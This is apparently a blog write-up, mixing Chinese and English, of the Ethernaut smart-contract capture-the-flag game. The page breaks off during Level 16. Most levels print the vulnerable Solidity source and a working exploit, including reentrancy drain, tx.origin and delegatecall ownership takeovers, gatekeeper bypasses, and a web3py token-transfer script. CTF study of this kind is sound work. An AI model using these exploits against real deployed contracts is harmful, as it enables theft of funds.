<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Ethernaut 通关笔记 | Ainevsia Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Ethernaut复活了，赶紧开始做题
Level 0. Hello Ethernaut 使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过
Level 1. Fallback 需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。
Level 2. Fallout 一款对程序猿友好的字体是多么重要。
一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。
复制到编辑器里就稍微明显一点了，不然我是真看不出区别。
Level 3. Coin Flip pragma solidity ^0.6.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ?">
<meta name="author" content="">
<link rel="canonical" href="https://ainevsia.github.io/post/ethernaut/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bf5f9f73cf17311d52cedbcda82c922e91b2f566d88a85ad9f5b5a08b586bd5f.css" integrity="sha256-v1&#43;fc88XMR1SztvNqCySLpGy9WbYioWtn1taCLWGvV8=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://ainevsia.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ainevsia.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://ainevsia.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://ainevsia.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://ainevsia.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Ethernaut 通关笔记" />
<meta property="og:description" content="Ethernaut复活了，赶紧开始做题
Level 0. Hello Ethernaut 使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过
Level 1. Fallback 需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。
Level 2. Fallout 一款对程序猿友好的字体是多么重要。
一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。
复制到编辑器里就稍微明显一点了，不然我是真看不出区别。
Level 3. Coin Flip pragma solidity ^0.6.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ainevsia.github.io/post/ethernaut/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-02-21T10:52:18+08:00" />
<meta property="article:modified_time" content="2021-02-21T10:52:18+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Ethernaut 通关笔记"/>
<meta name="twitter:description" content="Ethernaut复活了，赶紧开始做题
Level 0. Hello Ethernaut 使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过
Level 1. Fallback 需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。
Level 2. Fallout 一款对程序猿友好的字体是多么重要。
一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。
复制到编辑器里就稍微明显一点了，不然我是真看不出区别。
Level 3. Coin Flip pragma solidity ^0.6.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ?"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ainevsia.github.io/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Ethernaut 通关笔记",
      "item": "https://ainevsia.github.io/post/ethernaut/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Ethernaut 通关笔记",
  "name": "Ethernaut 通关笔记",
  "description": "Ethernaut复活了，赶紧开始做题\nLevel 0. Hello Ethernaut 使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过\nLevel 1. Fallback 需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。\nLevel 2. Fallout 一款对程序猿友好的字体是多么重要。\n一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。\n复制到编辑器里就稍微明显一点了，不然我是真看不出区别。\nLevel 3. Coin Flip pragma solidity ^0.6.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ?",
  "keywords": [
    
  ],
  "articleBody": "Ethernaut复活了，赶紧开始做题\nLevel 0. Hello Ethernaut 使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过\nLevel 1. Fallback 需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。\nLevel 2. Fallout 一款对程序猿友好的字体是多么重要。\n一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。\n复制到编辑器里就稍微明显一点了，不然我是真看不出区别。\nLevel 3. Coin Flip pragma solidity ^0.6.0; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } contract Hacker { address target = 0xDD0b2E36064953cD7b75c0a35aF25D82fF948575; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip cf = CoinFlip(target); function exploit() public { uint256 blockValue = uint256(blockhash(block.number - (1))); uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ? true : false; cf.flip(side); } } 还需要顺便复习一下web3py的用法\n最新的文档已经用get_storage_at这个函数了\nLevel 4. Telephone tx.origin是交易的发送方，不是方法调用的调用方。\npragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } contract Hacker { constructor () public { address payable account = 0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F; address target = 0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A; Telephone t = Telephone(target); t.changeOwner(account); selfdestruct(account); } } In [8]: w3.eth.getStorageAt(w3.toChecksumAddress('0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A'),0) Out[8]: HexBytes('0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f') Level 5. Token 一开始也是没有注意到有整数溢出，require(balances[msg.sender] - _value \u003e= 0); 和require(balances[msg.sender] \u003e= _vale);这两个是不一样的。\n第一个是先做了减法运算的，然后和0进行比较，而第二个是两个数直接进行比较。\n注意转账的接收方不能是自己，不然溢出之后又溢出回来了。\nLevel 6. Delegation There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.\nThis means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.\nThis makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure.\n.delegatecall(bytes memory) returns (bool, bytes memory)\nissue low-level DELEGATECALL with the given payload, returns success condition and return data, forwards all available gas, adjustable\nSource pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result, bytes memory data) = address(delegate).delegatecall(msg.data); if (result) { this; } } } The instance must be the Delegation contract.\nThe fallback function of Delegation contract trys to call the delegate address.\nAnd the Delegate contract has a pwn function that can change its ower to msg.sender . Since the delegatecall will not change msg.sener, we can change the owner to our attacker address.\nNotice that delegatecall only copys code from the target address to the current contract and executes, so the effect of doing the pwn() function is changing contract Delegation ’s owner variable, which are all at storage[0].\nExploit just call the fallback function of the Delegation contract, and msg.data set to keccack('pwn()') = 0xdd365b8b\nawait contract.sendTransaction({data : \"0xdd365b8b\"}) await contract.owner() Level 7. Force Some contracts will simply not take your money ¯_(ツ)_/¯\nThe goal of this level is to make the balance of the contract greater than zero.\nSource pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */} Decompiled contract Contract { function main() { memory[0x40:0x60] = 0x80; revert(memory[0x00:0x00]); } } so the default fallback generated is simply revert.\nWell i have no idea, so I searched for other people’s wp.\n强行将以太币置入合约的相关方式：1. 通过自毁、2. 创建前预先发送Ether、3. 为其挖矿。\nExploit I first forget to mark the contructor payable, and remix gives me kindly warnings:\ncreation of Hacker errored: VM error: revert. revert The transaction has been reverted to the initial state. Note: The called function should be payable if you send value and the value you send should be less than your current balance. Debug the transaction to get more information. // SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e0.8.0; contract Hacker { constructor() payable { selfdestruct(payable(0x2CcA84F27Bc45eFEEDce279C7c6dF6D0D02186b4)); } } Level 8. Vault Unlock the vault to pass the level!\nSource pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } Exploit no secret on blockchain.\nIn [1]: from web3.auto.infura.rinkeby import w3 In [2]: public = '0x817d3fcDf81E62AaaA1caf5e8CBD9b1417346d65' In [3]: addr = w3.toChecksumAddress(public) In [4]: w3.eth.get_storage_at(addr,0) Out[4]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000001') In [5]: w3.eth.get_storage_at(addr,1) Out[5]: HexBytes('0x412076657279207374726f6e67207365637265742070617373776f7264203a29') await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29') In [6]: w3.eth.get_storage_at(addr,0) Out[6]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000000') Level 9. King The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD\nSuch a fun game. Your goal is to break it.\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\nSource contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } fallback() external payable { require(msg.value \u003e= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; } } 没看懂题目是啥意思，我的目标是什么，看了wp\n注意到owner变量是不会改变的，所以说owner总是可以重新取回king的身份，目标是成为king并且保持king的身份。\nThe transfer function fails if the balance of the current contract is not large enough or if the Ether transfer is rejected by the receiving account. The transfer function reverts on failure.\ntransfer在失败的时候会回滚，所以只要我们不接受transfer就可以阻值代码的继续执行。\n// SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e0.8.0; contract Hacker { constructor() payable { require(address(this).balance == 1 ether, \"please give 1 ether\"); address target = 0xAc3c199067eB0Cb9a27A8230A1447865F35b4Ff6; (bool _res,) = target.call{value: 1 ether}(abi.encode(\"\")); } } Level 10. Re-entrancy The goal of this level is for you to steal all the funds from the contract.\nThings that might help:\nUntrusted contracts can execute code where you least expect it.\nFallback methods\nThrow/revert bubbling\nSometimes the best way to attack a contract is with another contract.\nSee the Help page above, section “Beyond the console”\nSource pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Reentrance { using SafeMath for uint256; mapping(address =\u003e uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] \u003e= _amount) { (bool result, bytes memory data) = msg.sender.call.value(_amount)(\"\"); if(result) { _amount; } balances[msg.sender] -= _amount; } } fallback() external payable {} } target: 0x22778878428C001234BC0d9A708D9664045d80BC\n分析 Originally, there was 1 ether in the contract, so our goal is to transfer this 1 ether back to our account.\naddress.transfer is safe as it has a gas stipend of 2300. but address.call.value().gas()() forwards all available gas (adjustable), and is not safe against reentrancy. Here is another reading.\n奥，我明白了，我总是试图在constructor函数中就完成整个exp链的构造，但是在这个时候我的各个编写的函数是还不存在的，我的fallack函数也不存在。所以这一题要利用fallback函数的话是不能够在一个constructor函数中就完成的，必须要在整个合约部署完成之后，再发起第二笔交易来进行攻击。所以说这题至少也需要两笔交易完成攻击。\n关于receive关键字。\n值得注意的是即便被攻击合约中写的是msg.sender.call.value(_amount)(\"\");，但是还是call了receive函数，也就是没有calldata。实验发现在fallback函数和receive函数同时存在的情况下会调用receive函数。\n从反编译结果来看也是没有calldata。\nvar temp0 = memory[0x40:0x60]; temp1, memory[temp0:temp0 + 0x00] = address(msg.sender).call.gas(msg.gas).value(arg0)(memory[temp0:temp0 + memory[0x40:0x60] - temp0]); 由于这里.call函数只接受一个bytes参数，而\"\"又是长度为0，所以就没有calldata了。如果把长度变成8，就是这样：\n(bool result, bytes memory data) = msg.sender.call.value(_amount)(\"deadbeef\"); ----- var temp1 = memory[0x40:0x60]; temp2, memory[temp1:temp1 + 0x00] = address(msg.sender).call.gas(msg.gas).value(arg0)(memory[temp1:temp1 + (temp0 + 0x08) - temp1]); 这是正常的行为，不是编译器的bug，这个bug在0.4.12就已经修复。\n推荐使用call而不再推荐使用transfer和send。自己防范重入。\nexp // SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e=0.8.0; interface Reentrance { function donate(address _to) external payable; function withdraw(uint _amount) external; } contract Hacker { address owner; Reentrance target = Reentrance(0x22778878428C001234BC0d9A708D9664045d80BC); uint cnt = 0; constructor() payable { require(msg.value == 1 ether, \"constructor(): Insufficient Fund.\"); owner = msg.sender; } modifier auth { require(msg.sender == owner, \"auth(): Not Authenticated.\"); _; } receive() external payable { if (cnt == 0) { cnt ++ ; target.withdraw(10 ** 18); // 1 ether } } function attack() public auth { target.donate{value: 1 ether}(address(this)); target.withdraw(10 ** 18); // 1 ether selfdestruct(payable(msg.sender)); } } Use the Checks-Effects-Interactions Pattern\nLevel 11. Elevator This elevator won’t let you reach the top of your building. Right?\nThings that might help:\nSometimes solidity is not good at keeping promises.\nThis Elevator expects to be used from a Building.\nSource pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } 实现一个简单的接口\nexp // SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e=0.8.0; interface Building { function isLastFloor(uint) external returns (bool); } interface Elevator { function goTo(uint _floor) external; } contract Hacker is Building { address owner; Elevator target = Elevator(0xaf6637c511207fe29A9eB0A11c869728380D505B); uint cnt = 0; constructor() payable { owner = msg.sender; } modifier auth { require(msg.sender == owner, \"auth(): Not Authenticated.\"); _; } function isLastFloor(uint floor) external override returns (bool) { require(floor \u003e= 0, \"isLastFloor(): Cannot Failed.\"); if (cnt == 0) { cnt ++ ; return false; } else { return true; } } function attack() public auth { target.goTo(2 ** 256 - 1); selfdestruct(payable(msg.sender)); } } Level 12. Privacy The creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\nThings that might help:\nUnderstanding how storage works\nUnderstanding how parameter parsing works\nUnderstanding how casting works\nSource pragma solidity ^0.6.0; contract Privacy { bool public locked = true; // 0 uint256 public ID = block.timestamp; // 1 uint8 private flattening = 10; // 2_0_1 uint8 private denomination = 255; // 2_1_2 uint16 private awkwardness = uint16(now); // 2_2_4 bytes32[3] private data; // 3 4 5 constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } Exp 链上没有隐私\nawait contract.unlock('0xc9e62529e16fdfb38db596273b2db912') 这一关的推荐阅读\nLevel 13. Gatekeeper One Source pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract GatekeeperOne { using SafeMath for uint256; address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft().mod(8191) == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } require(gasleft().mod(8191) == 0);这里我是有点懵的。如何测量走到这一步消耗了多少gas呢？\nhttps://hitcxy.com/2019/ethernaut/\ncallcode操作符是在自己的上下文中执行代码，但是msg.sender会发生改变。ref\ngeth自定义的opcodes\nIstanbul Fork新增的两个opcode\n柏林升级前移除 EIP-2315\n观察gateThree要求的条件，要求倒数第2 3个字节是0，要求高4个字节不为0，要求倒数1 2个字节是tx.origin\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Hacker { address target = 0x8c0d72c453b11E7507C4AcAA339004De5b1Ee3Be; constructor() { uint64 bts = 0xffffffff00000000; bts += uint16(uint160(tx.origin)); bool res; (res, ) = target.call{gas:254+81910}(abi.encodeWithSignature(\"enter(bytes8)\", bytes8(bts))); require(res == true, \"enter(): Attack Fail.\"); selfdestruct(payable(0)); } } 254是用remix调试出来的。\nLevel 14. Gatekeeper Two Source pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require( uint64( bytes8( keccak256(abi.encodePacked(msg.sender)) ) ) ^ uint64(_gateKey) == uint64(0) - 1 ); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } 分析，需要在constructor中完成利用。\n值得留意的事情：代码里uint64(0) - 1在0.8.0版本的编译器里会直接revert，好高级。自动溢出保护。\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Hacker { address target = 0xe7bdbFDaf1cddF5F16c81cB02FD49E57952E92FC; // bytes public B; constructor() { // address x = address(new GatekeeperTwo()); uint64 bts = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0xffffffffffffffff); // bts ^= uint64(0xffffffffffffffff); // bts ^= uint64(0) - 1; bool res; // target = x; bytes memory ret; (res, ret) = target.call(abi.encodeWithSignature(\"enter(bytes8)\", bytes8(bts))); // B = ret; require(res == true, \"enter(): Attack Fail.\"); selfdestruct(payable(0)); } function test () public pure returns(uint64) { return 2 ** 64 - 1; // return uint64(0) - 1; // this will revert !!! } } contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin, \"gate 1\"); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0, \"gate 2\"); _; } modifier gateThree(bytes8 _gateKey) { require( uint64( bytes8( keccak256(abi.encodePacked(msg.sender)) ) ) ^ uint64(_gateKey) == 2 ** 64 - 1 // uint64(0) - 1, \"gate 3\" ); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } function test(bytes8 _gateKey) public view returns (bytes8) { return bytes8(uint64( bytes8( keccak256(abi.encodePacked(msg.sender)) ) ) ^ uint64(_gateKey) ); } } Level 15. Naught Coin Source pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() { if (msg.sender == player) { require(now \u003e timeLock); _; } else { _; } } } Analysis In [3]: target = '0x153cD5C206630Dbd726891f2aE5e6CF031460cfE' In [4]: w3.eth.get_storage_at(target,0) Out[4]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000000') In [5]: w3.eth.get_storage_at(target,1) Out[5]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000000') In [6]: w3.eth.get_storage_at(target,2) Out[6]: HexBytes('0x00000000000000000000000000000000000000000000d3c21bcecceda1000000') In [7]: w3.eth.get_storage_at(target,3) Out[7]: HexBytes('0x4e6175676874436f696e00000000000000000000000000000000000000000014') In [8]: w3.eth.get_storage_at(target,4) Out[8]: HexBytes('0x3078300000000000000000000000000000000000000000000000000000000006') In [9]: w3.eth.get_storage_at(target,5) Out[9]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000012') In [10]: w3.eth.get_storage_at(target,6) Out[10]: HexBytes('0x00000000000000000000000000000000000000000000000000000000735d4e82') In [11]: w3.eth.get_storage_at(target,7) Out[11]: HexBytes('0x00000000000000000000000000000000000000000000d3c21bcecceda1000000') In [12]: w3.eth.get_storage_at(target,8) Out[12]: HexBytes('0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f') In [13]: bytes.fromhex('4e6175676874436f696e') Out[13]: b'NaughtCoin' In [14]: 0x14/2 Out[14]: 10.0 In [15]: bytes.fromhex('307830') Out[15]: b'0x0' In [16]: w3.eth.get_storage_at(target,9) Out[16]: HexBytes('0x0000000000000000000000000000000000000000000000000000000000000000') In [18]: 1000000 * (10**18) Out[18]: 1000000000000000000000000 In [19]: hex(_) Out[19]: '0xd3c21bcecceda1000000' 合约一开头是继承的父合约ERC20的结构体变量，发现lockTokens这个修饰器对时间有要求。\n但是ERC20可以转账的函数显然不止transfer一个函数。可以使用approve+transferFrom进行转账。\n有地方需要注意的是，ERC20不允许向0地址转账…..\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), \"ERC20: transfer from the zero address\"); require(recipient != address(0), \"ERC20: transfer to the zero address\"); EXP #!/usr/bin/python from web3.auto.infura.rinkeby import w3 from eth_abi import encode_abi assert w3.isConnected() private = ' -^=^- ' public = '0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F' target = '0x153cD5C206630Dbd726891f2aE5e6CF031460cfE' hacker_private = ' -^=^- ' hacker = '0x3465CBfee24B4b369304D3B0471851665034a303' empty = '0x0000000000000000000000000000000000000001' calldata = bytes(w3.keccak(b'approve(address,uint256)')[:4]) calldata += encode_abi(['address', 'uint256'], [hacker, 1000000 * (10 ** 18)]) txn = { \"from\": public, \"to\": target, \"gasPrice\": w3.toWei(1, 'gwei'), \"gas\": 0x32185, \"value\": w3.toWei(0, 'wei'), \"nonce\": w3.eth.getTransactionCount(public), \"data\": calldata } signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() print(txn_hash) txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(txn_receipt) calldata = bytes(w3.keccak(b'transferFrom(address,address,uint256)')[:4]) calldata += encode_abi(['address', 'address', 'uint256'], [public, empty, 1000000 * (10 ** 18)]) txn = { \"from\": hacker, \"to\": target, \"gasPrice\": w3.toWei(1, 'gwei'), \"gas\": 0x32185, \"value\": w3.toWei(0, 'wei'), \"nonce\": w3.eth.getTransactionCount(hacker), \"data\": calldata } signed_txn = w3.eth.account.signTransaction(txn, hacker_private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) assert txn_receipt['status'] == 1 print('[+] OK ' + str(txn_receipt['transactionIndex']) + ' @ ' + txn_receipt['transactionHash'].hex()) Level 16. Preservation This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\nSource pragma solidity ^0.6.0; contract Preservation { // public library contracts address public timeZone1Library; // 0 address public timeZone2Library; // 1 address public owner; // 2 uint storedTime; // 3 // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } // set the time for timezone 1 function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } // set the time for timezone 2 function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime; function setTime(uint _time) public { storedTime = _time; } } Analysis delegatecall调用外部函数storage位置没有对上，造成任意指定storage篡改\ntarget contract : 0x4464A38441e76713439883883752A60B02C24298\nIn [31]: target = '0x4464A38441e76713439883883752A60B02C24298' In [32]: w3.eth.get_storage_at(target,0) Out[32]: HexBytes('0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5') In [33]: w3.eth.get_storage_at(target,1) Out[33]: HexBytes('0x000000000000000000000000ea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1') 从反编译的结果来看library code就如源码中所示的那么简单，修改stoarge 0。\ncontract Contract { function main() { memory[0x40:0x60] = 0x80; var var0 = msg.value; if (var0) { revert(memory[0x00:0x00]); } if (msg.data.length \u003c 0x04) { revert(memory[0x00:0x00]); } var0 = msg.data[0x00:0x20] \u003e\u003e 0xe0; if (var0 != 0x3beb26c4) { revert(memory[0x00:0x00]); } var var1 = 0x56; var var2 = 0x04; var var3 = msg.data.length - var2; if (var3 \u003c 0x20) { revert(memory[0x00:0x00]); } func_0041(var2, var3); stop(); } function func_0041(var arg0, var arg1) { arg0 = msg.data[arg0:arg0 + 0x20]; storage[0x00] = arg0; } } 思路是先调用修改timeZone1Library的地址，然后delegatecall执行任意代码。\nEXP // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Preservation { function setFirstTime(uint _timeStamp) external; } contract ClaimOwnership { address 